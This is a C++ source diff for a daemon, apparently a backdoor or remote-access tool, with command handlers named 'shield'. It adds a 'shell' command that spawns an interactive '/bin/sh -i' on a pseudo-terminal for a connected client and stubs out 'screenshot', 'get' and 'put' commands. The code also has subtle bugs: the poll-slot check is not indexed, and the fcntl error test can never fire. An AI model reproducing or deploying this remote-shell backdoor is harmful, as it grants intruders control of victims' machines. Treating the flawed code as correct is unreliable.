@@ -1,8 +1,12 @@
-#include <shield/commands.hpp>
 #include <sstream>
+#include <pty.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include "DaemonServer.hpp"
 
-int shield_cmd_help(Client *client, const char *args)
+int shield_cmd_help(Client *client, DaemonServer *server, const char *args)
 {
+	(void) server; // unused parameter
 	if (!args | !*args)
 	{
 		for (int i = 0; COMMANDS[i].command != NULL; ++i)
@@ -41,22 +45,68 @@ int shield_cmd_help(Client *client, const char *args)
 	return (-1);
 }
 
-int	shield_cmd_shell(Client *client, const char *args)
+// Summon a shell for the client
+int	shield_cmd_shell(Client *client, DaemonServer *server, const char *args)
 {
+	(void) args; // unused parameter
+	int master_fd, pid;
+
+	pid = forkpty(&master_fd, NULL, NULL, NULL);
+
+	if (pid < 0)	//Error
+		return (1);
+	if ( pid == 0)
+	{
+		char *argv[] = {"sh", "-i", NULL};
+		char *envp[] = {NULL};
+		execve("/bin/sh", argv, envp);
+
+		MERR("execve failed");
+		exit(1);
+	}
+
+	if (fcntl(master_fd, F_SETFL, O_NONBLOCK) < -1)
+	{
+		MERR("fcntl on pty failed");
+		close(master_fd);
+		return (1);
+	}
+
+	for (size_t j = 0; j < MAX_FD; j++)
+	{
+		if (server->poll_metadata->fd_type == FD_UNUSED)
+		{
+			server->pollfd_array[j].fd = master_fd;
+			server->pollfd_array[j].events |= POLLIN;
+			server->poll_metadata[j].client_index = client->index;
+			server->poll_metadata[j].fd_type = FD_CLIENT_PTY;
+			break;
+		}
+	}
+	client->pty_fd = master_fd;
 	return (0);
 }
 
-int	shield_cmd_screenshot(Client *client, const char *args)
+int	shield_cmd_screenshot(Client *client, DaemonServer *server, const char *args)
 {
+	(void) client; // unused parameter
+	(void) server; // unused parameter
+	(void) args; // unused parameter
 	return (0);
 }
 
-int	shield_cmd_get(Client *client, const char *args)
+int	shield_cmd_get(Client *client, DaemonServer *server, const char *args)
 {
+	(void) client; // unused parameter
+	(void) server; // unused parameter
+	(void) args; // unused parameter
 	return (0);
 }
 
-int	shield_cmd_put(Client *client, const char *args)
+int	shield_cmd_put(Client *client, DaemonServer *server, const char *args)
 {
-	return(0);
+	(void) client; // unused parameter
+	(void) server; // unused parameter
+	(void) args; // unused parameter
+	return (0);
 }
